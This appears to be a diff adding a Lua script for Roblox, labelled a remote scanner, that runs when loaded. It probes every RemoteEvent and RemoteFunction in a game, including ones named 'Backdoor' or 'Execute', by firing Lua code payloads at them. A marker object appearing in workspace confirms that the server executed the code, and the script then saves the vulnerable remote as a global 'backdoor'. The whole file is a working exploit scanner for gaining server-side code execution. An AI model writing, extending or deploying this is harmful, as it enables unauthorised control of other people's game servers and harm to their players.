@@ -1,0 +1,102 @@
+-- Remote scanner core (hosted on GitHub)
+
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+
+_G.backdoor = nil
+_G.backdoorPath = nil
+
+local function generateName(len)
+    local name = ""
+    for i = 1, len do
+        name = name .. alphabet[math.random(1, #alphabet)]
+    end
+    return name
+end
+
+_G.fireRemote = function(remote, payload)
+    if remote:IsA("RemoteEvent") then
+        remote:FireServer(payload)
+    elseif remote:IsA("RemoteFunction") then
+        task.spawn(function()
+            pcall(function()
+                remote:InvokeServer(payload)
+            end)
+        end)
+    end
+end
+
+local function testPayload(remote, code)
+    local payloads = {
+        "a=Instance.new('Folder',workspace)a.Name='"..code.."'",
+        "Instance.new('StringValue',workspace).Name='"..code.."'",
+        "Instance.new('IntValue',workspace).Value=math.random(1,999999);Instance.new('Folder',workspace).Name='"..code.."'",
+        "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
+    }
+    for _, payload in ipairs(payloads) do
+        _G.fireRemote(remote, payload)
+    end
+    if remote:IsA("RemoteFunction") then
+        task.spawn(function()
+            pcall(function()
+                remote:InvokeServer("test", payloads[1])
+                remote:InvokeServer("run", payloads[1])
+                remote:InvokeServer("", payloads[1])
+            end)
+        end)
+    end
+end
+
+local function scan()
+    local tests = {}
+    local rs = game:GetService("ReplicatedStorage")
+
+    local possibleNames = {
+        "lh" .. (game.PlaceId / 6666 * 1337 * game.PlaceId),
+        "MainRemote","Remote","Execute","Server","Backdoor",
+        tostring(game.PlaceId * 1337),
+    }
+
+    for _, name in ipairs(possibleNames) do
+        local remote = rs:FindFirstChild(name) or rs:FindFirstChild(tostring(name))
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            local code = generateName(math.random(15, 25))
+            testPayload(remote, code)
+            tests[code] = {remote = remote, path = remote:GetFullName()}
+        end
+    end
+
+    for _, remote in ipairs(game:GetDescendants()) do
+        if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end
+        local fullName = remote:GetFullName()
+        if fullName:find("^RobloxReplicatedStorage") then continue end
+        if remote.Name == "__FUNCTION" then continue end
+        local parent = remote.Parent
+        local pparent = parent and parent.Parent
+        if pparent and pparent.Name == "HDAdminClient" then continue end
+        if parent and parent.Name == "DefaultChatSystemChatEvents" then continue end
+
+        local code = generateName(math.random(15, 30))
+        testPayload(remote, code)
+        tests[code] = {remote = remote, path = fullName}
+    end
+
+    for _ = 1, 120 do
+        for code, info in pairs(tests) do
+            if workspace:FindFirstChild(code) then
+                local obj = workspace:FindFirstChild(code)
+                if obj then obj:Destroy() end
+                _G.backdoor = info.remote
+                _G.backdoorPath = info.path
+                return true
+            end
+        end
+        task.wait(0.05)
+    end
+    return false
+end
+
+-- Run the scan immediately when loaded from remote
+task.spawn(function()
+    scan()
+end)
